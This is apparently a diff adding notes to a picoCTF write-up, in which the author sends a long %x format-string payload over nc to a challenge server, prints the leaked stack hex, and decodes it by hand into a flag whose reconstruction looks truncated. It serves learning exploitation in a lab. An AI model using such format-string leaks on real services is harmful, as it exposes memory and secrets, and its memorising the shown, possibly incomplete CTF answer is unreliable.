@@ -54,3 +54,25 @@ flag.txt
 
 
 https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/
+
+
+
+
+earthwarrior@LAPTOP-VLDN28C5:~$ nc saturn.picoctf.net 53394
+Tell me a story and then I'll tell you one >> %x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x
+Here's a story -
+ff9a22c0:ff9a22e0:8049346:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:253a78:6f636970:7b465443:6b34334c:5f676e31:67346c46:6666305f:3474535f:
+
+by copy pasting into a hexadec to text website https://www.rapidtables.com/convert/number/hex-to-ascii.html
+we get
+ÿ"Àÿ"àI4bS§WS§§S¢S§WS§§S¢S§WS§§S¢S§WS§§S¢S§WS§§S¢S§WS§§S¢S§WS§§S¢S§WS§§S¢S§WS§§S¢S§WS§§S¢S§RS§ö6´eD6³C4ÅövãsFÄffcóGE5
+
+
+after some trail and error i just deleted part of the initial text
+now translating 
+78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:253a78:6f636970:7b465443:6b34334c:5f676e31:67346c46:6666305f:3474535f:
+we get
+x%:x:x%:%:x%x%:x:x%:%:x%x%:x:x%:%:x%x%:x:x%:%:x%x%:x:x%:%:x%x%:x:x%:%:x%x%:x:x%:%:x%x%:x:x%:%:x%x%:x:x%:%:x%%:xocip{FTCk43L_gn1g4lFff0_4tS_
+
+of which ocip{FTCk43L_gn1g4lFff0_4tS_ looks like the flag but jumbled
+{k43L_gn1 g4lF ff0_ 4tS _     |  picoCTF{L34king_Fl4g_0ff_St4_}
